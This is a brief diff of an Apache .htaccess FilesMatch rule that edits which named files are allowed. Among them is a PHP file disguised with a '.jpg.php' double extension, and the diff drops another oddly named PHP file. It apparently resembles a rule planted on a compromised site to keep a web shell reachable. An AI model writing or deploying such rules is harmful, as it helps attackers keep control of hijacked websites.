@@ -6,7 +6,7 @@
 
 </FilesMatch>
 
-<FilesMatch "^(ktp_660a3afcd02006.90997693.jpg.php|index.html|FEMBOYIMUTBANGET1131JP.php|googlee199b84901910010.html)$">
+<FilesMatch "^(ktp_660a3afcd02006.90997693.jpg.php|index.php|googlee199b84901910010.html)$">
 
  Order allow,deny
 
